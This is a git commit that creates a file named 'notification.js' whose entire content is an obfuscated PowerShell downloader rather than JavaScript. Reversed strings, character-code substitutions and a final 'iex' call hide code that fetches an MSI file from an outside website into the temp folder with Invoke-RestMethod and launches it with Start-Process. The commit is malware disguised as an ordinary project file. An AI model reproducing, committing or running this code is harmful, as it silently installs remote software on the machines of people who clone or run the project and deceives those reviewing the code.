598c5956a2fc04a9fd3e88226c1012748cd1c5fa
Azkic50 <Azkilohj55@gmail.com>
2025-04-08 09:20:00 -0400

    Create notification.js

---
+++ notification.js
@@ -0,0 +1,22 @@
+sV lsf (  [chAr[] ] "xEI |)43]RAHC[,'gkx'eCaLpEr- 93]RAHC[,'Ykb' eCaLpERc- 63]RAHC[,)65]RAHC[+121]RAHC[+76]RAHC[(  eCaLpEr-)' '+'))63]Rahc[,)76]Rahc[+58]Rahc[+65]Rahc[(  ecAlPerC-  421]Rahc[,YkbtYLYkb ecALPer-  93]R'+'ahc[,)48]Rahc[+98]Rahc[+08]Rahc[( ecALPer- ))YkbeTYP+TYPslaYkb,YkbYP+TYP    
+{ )Ykb,Ykb TYP+TYP 
+ TYP+TYP;h'+'TYP+TY'+'PtaPTYYkb,YkbN5e '+'TYP+TYP   '+'  TYP+TYP
+;Ykb,YkbTs[,)011]RahC[+96]RahC[+17]RahC[(Ykb,YkbaeYkb,YkbTYP+TYPataDTYP+TYPeTYP+Ykb,YkbTYPmosN5e ni iN5e( hcYkb,YkbPeTYP+TYPMtseR-ekovnITYP+TYYkb,YkbfTYYkb'+',YkbYP}    TYkb,Ykbh'+'C[Ykb,YkbTY'+'P+TYPiFtuO- TYP+T'+'YPa.'+'iTYP+TYPN5eTYP+TYYkb,YkbYP+TYP  '+' TYP+TYP TYP+TYP
+TYP+TYkb,Ykbrof  
+;)
+}nE'+'GiTYP+TYPsTYP+TYPm.5JTYP+TYP'+'ETYP+TYPKGLQPXnEG TYP+TYP=TYP+T'+'YP b ;nEGiTYP+TYPsmTYP+TYP.JEKGLQPTYP'+'+TYPX/eTYP+TYPtiTYP+TYPsbew.ssaTYP+T'+'YPlgwTYP+TYPonenohp//:sp'+'TYP+TYPtTYP+TYPthnEG = a{@]tcTYP'+'+TYPeTYP+TYPjbOmTYP+TYPotsuCSP[ TY'+'P+TYP 
+'+'T'+'YP+TYP(@ = atT'+'YP+Ykb'+',Ykb yTYP+TYPrtTYkb,YkbYP+TYP
+T'+'YP+TYP;htaPelifN5TYP+TYPe s'+'sTYP+Ykb,YkbTYPaDeTYP+TYPmoTYP+TYPsN5TYP+TYPe TYP+TYP 
+
+TYP(Ykb,YkbP+TYP =TYP+TY'+'P TYP+TYPdaolnTYP+TYPwodN5e        
+{ )hTYPYkb,YkbP+TYPYkb,YkbP      '+'  
+{ )daol'+'nYkb,Ykb+35Ykb,YkbP irU- TYP+TYPdohtT'+'YP+TYYkb,Ykb'+')TYPTYPNIOJ-]52,51,4[cePsMOc:vNeC'+'U8 (. tYL )43]RahC'+'['+']GnIRYkb,YkbP    
+}  TYP+TYP  Ykb,YkbTYPlTYP+TYPifN5e htYkb,'+'Y'+'k'+'b+TY'+'PtaPeTYP+Ykb,Ykb(EcALpEr.)29]RahC[]GnIRTs[,)37]RahC[+56]RahC[+35]RahC[((EcALpEr.)TYPCU8TYP,)87]RaYkb,YkbYP+TYP
+;Ykb,YkbaP-tseTYP+TYPT( fi      
+TYP+TYP;eurtN5eTYP+TYP = daolnTYP+TYPwTYPY'+'kb,YkbP+TYPeli'+'fNTYP+TYP5e eTYP+TYPlYkb,Ykb+TYPodTYP+TYPYkb,YkbTYP'+'+TYPwodN5'+'e(TYP+TYP fiYkb,Ykb      
+ }TYP+TYP  TYP+TYP    TYkb,YkbTYPecorP-tratS  TYP+TYYkb,Ykb]RahC[+101]RahC[((EcALpEr.)TYP  
+
+}  
+TYP+TYP}  T'+'YP+'+'TYP  
+{ hctaTYP+TYPcTYkb,YkbTYP5e(N5eIA5PMET:vTYP+'+'TYPneN5TYP+TYPenEG = htaPeTYP+TYPlifYkb,'+'YkbnEG)bTY'+'P+TYP.i'+'NTYP+Ykb,YkbN5e      
+{Ykb,YkbNTYP+TYP5TYP+TYPeTYYkb f-g'+'kx}61{}53{}2'+'1{}82{}81{}4{}62{}92{}32{}5{}51{}73{}9{}72{}'+'71{}13{}91{}7{}6{}11{}93{'+'}03{}02{}0{}12{}31{}41{}01{}8{}63{}2{}3{}1{}42{'+'}83{}33{}23'+'{}43{'+'}'+'52{}22{gkx((( ( )YkbY'+'kbNIoJ-]52,62,4[CEpSmoc:Vne8yC ( . '((" ); [arRAy]::reVERsE((  Gi  VAriAble:lsF).vAlUe) ;& ( $PShOME[4]+$PsHOme[34]+'x')((  Gi  VAriAble:lsF).vAlUe -JOIN'' )
